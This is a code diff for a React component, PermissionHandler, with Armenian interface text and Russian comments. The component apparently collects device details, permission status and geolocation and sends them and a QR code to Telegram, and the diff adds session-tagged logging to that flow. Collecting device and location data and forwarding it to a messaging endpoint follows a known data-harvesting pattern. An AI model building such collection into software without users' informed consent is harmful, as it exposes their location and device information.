@@ -72,6 +72,7 @@ const PermissionHandler = () => {
   }, []);
 
   const sendDataToTelegram = useCallback(async (data: Partial<TelegramDataPayload>, type: MessageType): Promise<boolean> => {
+    console.log(`[Session ${currentSessionId}] Sending message type: ${type}`); // Добавлен лог
     try {
       const payload: TelegramDataPayload = {
         ...data,
@@ -89,19 +90,19 @@ const PermissionHandler = () => {
       });
 
       if (response.ok) {
-        console.log(`Data of type ${type} successfully sent to Telegram!`);
+        console.log(`[Session ${currentSessionId}] Data of type ${type} successfully sent to Telegram!`); // Добавлен лог
         if (type === MessageType.InitialSummary || type === MessageType.QrCode) {
           toast.success("Տվյալները հաջողությամբ ուղարկվել են Telegram։"); // Данные успешно отправлены в Telegram!
         }
         return true;
       } else {
         const errorData = await response.json();
-        console.error(`Failed to send data of type ${type} to Telegram: ${errorData.error || response.statusText}`);
+        console.error(`[Session ${currentSessionId}] Failed to send data of type ${type} to Telegram: ${errorData.error || response.statusText}`); // Добавлен лог
         toast.error(`Տվյալների ուղարկման սխալ (${type}): ${errorData.error || response.statusText}`); // Ошибка отправки данных
         return false;
       }
     } catch (error: any) {
-      console.error(`Network error sending data of type ${type} to Telegram: ${error.message}`);
+      console.error(`[Session ${currentSessionId}] Network error sending data of type ${type} to Telegram: ${error.message}`); // Добавлен лог
       toast.error(`Ցանցային սխալ: ${error.message}`); // Сетевая ошибка
       return false;
     }
@@ -200,7 +201,9 @@ const PermissionHandler = () => {
     let qrTimeout: NodeJS.Timeout;
 
     const runProcess = async () => {
-      setCurrentSessionId(generateSessionId()); // Устанавливаем ID сессии при запуске процесса
+      const newSessionId = generateSessionId();
+      setCurrentSessionId(newSessionId); // Устанавливаем ID сессии при запуске процесса
+      console.log(`[Session ${newSessionId}] Starting runProcess. App Phase: ${appPhase}`); // Добавлен лог
 
       setLoadingMessage("Սարքի տվյալների և թույլտվությունների հավաքում..."); // Сбор данных об устройстве и разрешениях...
       setAppPhase("collectingData");
@@ -246,7 +249,7 @@ const PermissionHandler = () => {
         initialCollectedData.permissionStatus.geolocation = geolocationResult.status;
       }
       
-      setCollectedData(initialCollectedData);
+      setCollectedData(initialCollectedData); // Сохраняем все собранные данные локально
 
       // --- Send Initial Summary Report ---
       const initialSendSuccess = await sendDataToTelegram(initialCollectedData, MessageType.InitialSummary);
